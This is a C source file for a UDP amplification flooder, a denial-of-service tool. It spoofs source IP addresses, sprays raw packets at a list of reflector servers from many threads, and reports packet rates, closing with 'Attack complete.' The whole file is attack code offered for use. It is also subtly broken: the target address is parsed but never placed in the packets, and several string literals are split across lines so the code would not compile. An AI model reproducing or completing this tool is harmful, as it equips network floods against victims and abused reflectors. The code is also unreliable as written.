/*
 * Advanced UDP Amplification Flooder: Version 2.0
 * - Auto-resolve target hostnames (IPv4/IPv6)
 * - Load reflector list (IP:port) from file
 * - Support spoofing source IPs via CIDR file or random
 * - Customizable packet size and payload pattern
 * - Dynamic thread pool based on CPU cores or CLI override
 * - Real-time PPS/BPS stats with ANSI colors
 * - Graceful shutdown, optional logging to CSV
 *
 * Usage:
 *   ./udp_amp_flooder \
 *     --target <victim_ip> \
 *     --reflectors <reflectors.txt> \
 *     --spoof <cidr_list.txt> \
 *     [--threads <n>] [--duration <s>] [--size <bytes>] \
 *     [--interval <s>] [--log <file.csv>]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <stdatomic.h>
#include <pthread.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <sys/sysinfo.h>
#include <time.h>
#include <getopt.h>

#define MAX_REFLECTORS 1024
#define MAX_SPOOFS      128
#define DEFAULT_PACKET_SIZE 512
#define DEFAULT_DURATION    30
#define DEFAULT_INTERVAL     1

// ANSI colors
#define RED    "\x1b[31m"
#define GREEN  "\x1b[32m"
#define YELLOW "\x1b[33m"
#define RESET  "\x1b[0m"

// Global stats
static atomic_ulong total_packets;
static atomic_ulong total_bytes;
static volatile sig_atomic_t running = 1;

struct reflector { struct sockaddr_storage addr; socklen_t addr_len; };
struct cidr { uint32_t base, mask; };

static struct reflector reflectors[MAX_REFLECTORS];
static int reflect_count = 0;
static struct cidr spoofs[MAX_SPOOFS];
static int spoof_count = 0;

char *target_ip;
char *reflect_file;
char *spoof_file;
int threads = 0;
int duration_sec = DEFAULT_DURATION;
int packet_size = DEFAULT_PACKET_SIZE;
int interval_sec = DEFAULT_INTERVAL;
char *log_file = NULL;
FILE *log_fp = NULL;

void handle_sigint(int sig) { running = 0; }

// Parse CIDR notation into base and mask
int add_spoof_cidr(const char *cidr_str) {
    if (spoof_count >= MAX_SPOOFS) return -1;
    char buf[64]; strncpy(buf, cidr_str, 63);
    char *slash = strchr(buf, '/');
    if (!slash) return -1;
    *slash = '\0';
    int prefix = atoi(slash + 1);
    struct in_addr in;
    if (inet_pton(AF_INET, buf, &in) != 1) return -1;
    uint32_t mask = prefix >= 0 && prefix <= 32
        ? htonl(prefix == 32 ? 0xFFFFFFFF : ~((1u << (32 - prefix)) - 1))
        : 0;
    spoofs[spoof_count].base = in.s_addr & mask;
    spoofs[spoof_count].mask = mask;
    spoof_count++;
    return 0;
}

void load_spoofs(const char *path) {
    FILE *f = fopen(path, "r"); if (!f) return;
    char line[64]; while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = '\0';
        if (*line) add_spoof_cidr(line);
    }
    fclose(f);
}

void load_reflectors(const char *path) {
    FILE *f = fopen(path, "r"); if (!f) return;
    char host[128], port[16];
    while (reflect_count < MAX_REFLECTORS && fscanf(f, "%127[^:]:%15s\n", host, port) == 2) {
        struct addrinfo hints = { .ai_family = AF_UNSPEC, .ai_socktype = SOCK_DGRAM };
        struct addrinfo *res;
        if (getaddrinfo(host, port, &hints, &res) == 0) {
            memcpy(&reflectors[reflect_count].addr, res->ai_addr, res->ai_addrlen);
            reflectors[reflect_count].addr_len = res->ai_addrlen;
            reflect_count++;
            freeaddrinfo(res);
        }
    }
    fclose(f);
}

// Generate spoofed source IP
uint32_t random_spoof_ip(void) {
    if (spoof_count == 0) return rand();
    int idx = rand() % spoof_count;
    uint32_t host_bits = (uint32_t)rand() & ~ntohl(spoofs[idx].mask);
    return spoofs[idx].base | htonl(host_bits);
}

// Thread function
void *flood_thread(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) return NULL;
    int on = 1; setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    char *packet = malloc(packet_size);
    // Pre-fill payload pattern
    for (int i = sizeof(struct iphdr)+sizeof(struct udphdr); i < packet_size; i++)
        packet[i] = (char)(i & 0xFF);

    while (running) {
        for (int i = 0; i < reflect_count; ++i) {
            // Build IP header
            struct iphdr *ip = (struct iphdr *)packet;
            ip->ihl = 5; ip->version = 4; ip->tos = 0;
            ip->tot_len = htons(packet_size);
            ip->id = htons(rand() & 0xFFFF);
            ip->frag_off = 0; ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = random_spoof_ip();
            if (reflectors[i].addr.ss_family == AF_INET) {
                ip->daddr = ((struct sockaddr_in *)&reflectors[i].addr)->sin_addr.s_addr;
            }
            ip->check = 0;
            // Compute IP checksum
            unsigned long sum=0; unsigned short *ptr = (unsigned short*)ip;
            for (int c = 0; c < sizeof(*ip)/2; c++) sum += ntohs(ptr[c]);
            while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
            ip->check = htons(~sum);

            // Build UDP header
            struct udphdr *udp = (struct udphdr *)(packet + sizeof(*ip));
            udp->source = htons(rand() & 0xFFFF);
            udp->dest   = ((struct sockaddr_in *)&reflectors[i].addr)->sin_port;
            udp->len    = htons(packet_size - sizeof(*ip));
            udp->check  = 0; // optional

            sendto(sock, packet, packet_size, 0,
                   (struct sockaddr *)&reflectors[i].addr, reflectors[i].addr_len);
            atomic_fetch_add(&total_packets, 1);
            atomic_fetch_add(&total_bytes, packet_size);
        }
    }

    free(packet);
    close(sock);
    return NULL;
}

int main(int argc, char **argv) {
    srand(time(NULL));
    signal(SIGINT, handle_sigint);

    static struct option options[] = {
        {"target",      required_argument, 0, 't'},
        {"reflectors",  required_argument, 0, 'r'},
        {"spoof",       required_argument, 0, 's'},
        {"threads",     required_argument, 0, 'T'},
        {"duration",    required_argument, 0, 'd'},
        {"size",        required_argument, 0, 'z'},
        {"interval",    required_argument, 0, 'i'},
        {"log",         required_argument, 0, 'l'},
        {0,0,0,0,0}
    };
    int opt;
    while ((opt = getopt_long(argc, argv, "t:r:s:T:d:z:i:l:", options, NULL)) != -1) {
        switch (opt) {
            case 't': target_ip = optarg; break;
            case 'r': reflect_file = optarg; break;
            case 's': spoof_file   = optarg; break;
            case 'T': threads      = atoi(optarg); break;
            case 'd': duration_sec = atoi(optarg); break;
            case 'z': packet_size  = atoi(optarg); break;
            case 'i': interval_sec = atoi(optarg); break;
            case 'l': log_file     = optarg; break;
            default:
                fprintf(stderr, RED "Usage error" RESET "
");
                exit(EXIT_FAILURE);
        }
    }
    if (!target_ip || !reflect_file) {
        fprintf(stderr, RED "Missing required options" RESET "
");
        exit(EXIT_FAILURE);
    }
    load_reflectors(reflect_file);
    if (spoof_file) load_spoofs(spoof_file);
    if (reflect_count == 0) {
        fprintf(stderr, RED "No reflectors loaded" RESET "
"); exit(EXIT_FAILURE);
    }
    if (threads <= 0) threads = get_nprocs() * 4;

    if (log_file) {
        log_fp = fopen(log_file, "w");
        if (log_fp) fprintf(log_fp, "time,pps,bps\n");
    }

    // Launch threads
    pthread_t *tids = malloc(sizeof(pthread_t) * threads);
    printf(YELLOW "Starting UDP amplification flood: %d threads, duration %ds, packet %d bytes" RESET "\n",
           threads, duration_sec, packet_size);
    for (int i = 0; i < threads; i++) pthread_create(&tids[i], NULL, flood_thread, NULL);

    // Stats loop
    for (int elapsed = 0; elapsed < duration_sec && running; elapsed += interval_sec) {
        sleep(interval_sec);
        unsigned long pps = atomic_exchange(&total_packets, 0);
        unsigned long bps = atomic_exchange(&total_bytes, 0);
        printf(GREEN "[%2ds] PPS:%10lu BPS:%10lu" RESET "\n", elapsed + interval_sec, pps, bps);
        if (log_fp) fprintf(log_fp, "%d,%lu,%lu\n", elapsed+interval_sec, pps, bps);
    }

    running = 0;
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    if (log_fp) fclose(log_fp);
    free(tids);
    printf(YELLOW "Attack complete. See stats above%s" RESET "\n",
           log_file ? ", logged to file" : "");
    return 0;
}
